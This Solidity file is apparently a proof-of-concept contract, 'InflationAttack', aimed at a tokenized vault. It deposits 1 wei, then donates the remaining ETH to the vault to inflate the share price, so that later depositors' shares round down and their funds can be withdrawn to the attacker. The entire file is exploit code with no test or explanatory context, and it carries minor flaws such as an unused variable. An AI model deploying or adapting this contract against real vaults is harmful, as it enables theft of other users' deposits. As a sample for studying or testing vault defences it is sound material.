
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit(uint256 assets, address receiver) external payable returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

contract InflationAttack {
    IVault public vault;
    address public owner;
    
    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }
    
    function attack() external payable {
        // Step 1: Deposit 1 wei
        vault.deposit{value: 1}(1, address(this));
        
        // Step 2: Donate to inflate
        (bool ok,) = address(vault).call{value: msg.value - 1}("");
        require(ok);
    }
    
    function withdraw() external {
        uint256 shares = vault.balanceOf(address(this));
        vault.withdraw(type(uint256).max, owner, address(this));
    }
    
    receive() external payable {}
}
